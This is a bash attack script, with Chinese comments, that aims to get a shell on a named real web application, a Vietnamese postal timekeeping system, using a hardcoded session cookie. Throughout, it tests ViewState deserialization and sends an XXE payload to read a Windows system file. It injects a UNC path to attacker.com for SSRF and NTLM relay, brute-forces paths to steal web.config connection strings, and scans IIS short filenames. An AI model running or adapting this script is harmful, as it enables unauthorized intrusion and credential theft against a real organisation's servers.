#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 Chamcong替代GetShell方法"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

mkdir -p alternative_methods && cd alternative_methods

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[1] ViewState反序列化攻击"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "ASP.NET ViewState可能存在反序列化漏洞..."
echo ""

# 获取ViewState样本
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3 | head -1)

echo "ViewState样本:"
echo "$VS" | cut -c1-100
echo ""

# 检查是否启用MAC验证（如果没有，可以伪造ViewState）
if [ -n "$VS" ]; then
    # 尝试修改ViewState触发错误，看是否有MAC验证
    echo "测试MAC验证..."
    
    modified_vs=$(echo "$VS" | sed 's/A/B/g' | head -c 50)
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=${modified_vs}xxx" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        2>&1)
    
    if echo "$resp" | grep -qi "MAC validation\|invalid viewstate\|viewstate.*corrupt"; then
        echo "  ❌ 启用了MAC验证（难以利用）"
    elif echo "$resp" | grep -qi "deserialization\|type.*not found"; then
        echo "  🔥🔥🔥 可能存在反序列化漏洞！"
    else
        echo "  ⚠️  响应大小: $(echo $resp | wc -c) bytes"
    fi
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[2] XXE攻击（如果有XML端点）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>'

# 测试所有可能的API端点
API_ENDPOINTS=("/api/data" "/api/import" "/api/upload" "/webservice.asmx")

for endpoint in "${API_ENDPOINTS[@]}"; do
    echo ""
    echo "  测试: $endpoint"
    resp=$(curl -sk "${BASE}${endpoint}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        -H "Content-Type: application/xml" \
        --data "$XXE_PAYLOAD" \
        2>&1)
    
    # 检查win.ini特征
    if echo "$resp" | grep -qiE "\[fonts\]|\[extensions\]|for 16-bit app"; then
        echo "    🔥🔥🔥 XXE成功！可以读取文件！"
        echo "$resp" | head -30
        echo "$resp" > "xxe_success_${endpoint//\//_}.txt"
    else
        status=$(echo "$resp" | grep -oE "HTTP.*[0-9]{3}" | head -1)
        echo "    响应: $(echo $resp | wc -c) bytes"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[3] SSRF攻击（利用Export功能）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "如果Export功能会加载外部资源，可能存在SSRF..."
echo ""

# 设置一个监听（实际应该用外部服务器）
echo "  测试：尝试让服务器访问内网"

# 获取ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# 尝试让服务器解析UNC路径（SSRF/NTLM Relay）
echo "  测试UNC路径..."
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=//attacker.com/share/test" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o ssrf_unc_test.html 2>&1

size=$(wc -c < ssrf_unc_test.html)
echo "  响应: $size bytes"

if [ $size -gt 10000 ]; then
    echo "    可能触发了某些操作（响应较大）"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[4] 尝试读取web.config（多种方法）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

WEB_CONFIG_METHODS=(
    "${BASE}/web.config"
    "${BASE}/Web.config"
    "${BASE}/WEB.CONFIG"
    "${BASE}web.config"
    "${BASE}\\web.config"
    "${BASE}/web.config.txt"
    "${BASE}/web.config.bak"
    "${BASE}/web.config~"
    "${BASE}/web.config.old"
    "${BASE}/backup/web.config"
    "${BASE}/../web.config"
    "${BASE}/..\\web.config"
)

for method in "${WEB_CONFIG_METHODS[@]}"; do
    echo -n "  $method: "
    resp=$(curl -sk "$method" -H "Cookie: $COOKIE" -w "%{http_code}" 2>&1)
    http_code=$(echo "$resp" | tail -c 4)
    
    if [ "$http_code" == "200" ]; then
        # 检查是否真的是web.config
        if echo "$resp" | grep -qi "<configuration>\|<appSettings>\|connectionString"; then
            echo "🔥🔥🔥 成功！"
            echo "$resp" > "webconfig_found.xml"
            
            # 提取connectionString
            echo "$resp" | grep -i "connectionString" | head -5
            break
        else
            echo "$http_code (不是web.config)"
        fi
    else
        echo "$http_code"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[5] IIS短文件名扫描"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "检测8.3短文件名泄露..."
echo ""

# 测试~1技巧
SHORT_TESTS=(
    "${BASE}/WEB~1.CON/web.config"
    "${BASE}/UPLOAD~1"
    "${BASE}/ADMIN~1"
    "${BASE}/CONFIG~1"
)

for test in "${SHORT_TESTS[@]}"; do
    echo -n "  $test: "
    resp=$(curl -sk "$test" -w "%{http_code}" -o /dev/null 2>&1)
    
    if [ "$resp" == "404" ]; then
        echo "404"
    else
        echo "$resp 🔥"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 替代方法测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
